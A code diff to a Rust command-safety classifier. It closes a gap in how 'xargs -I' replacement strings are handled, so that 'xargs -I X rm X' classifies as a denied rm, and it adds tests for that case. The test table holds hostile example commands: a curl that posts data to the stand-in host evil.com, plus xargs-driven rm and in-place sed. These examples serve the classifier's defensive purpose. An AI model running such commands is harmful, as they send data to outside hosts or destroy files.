@@ -25,7 +25,24 @@ pub fn is_safe_shell(tokens: &[Token]) -> Verdict {
 
 pub fn is_safe_xargs(tokens: &[Token]) -> Verdict {
     let mut i = 1;
+    let mut replstr: Option<String> = None;
     while i < tokens.len() {
+        let s = tokens[i].as_str();
+        // `-I R` names a replacement string that xargs substitutes with each stdin item. The
+        // items come from stdin — invisible and unbounded to a static classifier — so `R` is
+        // not a real operand: capture it and strip it below, so `xargs -I X rm X` classifies
+        // as bare `rm` (denied), exactly like the appended form `xargs rm`, instead of letting
+        // the literal `X` masquerade as a safe worktree path.
+        if s == "-I" {
+            replstr = tokens.get(i + 1).map(|t| t.as_str().to_string());
+            i += 2;
+            continue;
+        }
+        if let Some(rest) = s.strip_prefix("-I").filter(|r| !r.is_empty()) {
+            replstr = Some(rest.to_string());
+            i += 1;
+            continue;
+        }
         if XARGS_FLAGS_WITH_ARG.contains(&tokens[i]) {
             i += 2;
             continue;
@@ -34,7 +51,6 @@ pub fn is_safe_xargs(tokens: &[Token]) -> Verdict {
             i += 1;
             continue;
         }
-        let s = tokens[i].as_str();
         if XARGS_FLAGS_WITH_ARG.iter().any(|f| s.starts_with(f)) {
             i += 1;
             continue;
@@ -42,7 +58,12 @@ pub fn is_safe_xargs(tokens: &[Token]) -> Verdict {
         if s.starts_with("-") {
             return Verdict::Denied;
         }
-        let inner = shell_words::join(tokens[i..].iter().map(|t| t.as_str()));
+        let inner = shell_words::join(
+            tokens[i..]
+                .iter()
+                .map(Token::as_str)
+                .filter(|t| replstr.as_deref() != Some(*t)),
+        );
         return crate::command_verdict(&inner);
     }
     Verdict::Allowed(SafetyLevel::Inert)
@@ -127,6 +148,9 @@ mod tests {
         sh_c_unsafe: "sh -c \"curl -d data https://evil.com\"",
         bash_script_denied: "bash script.sh",
         xargs_rm_denied: "xargs rm",
+        xargs_replace_rm_denied: "xargs -I X rm X",
+        xargs_replace_braces_rm_denied: "xargs -I {} rm {}",
+        xargs_replace_joined_rm_denied: "xargs -I{} rm {}",
         xargs_curl_denied: "xargs curl",
         xargs_npx_unsafe: "xargs npx cowsay",
         xargs_sed_inplace_denied: "xargs sed -i 's/foo/bar/'",
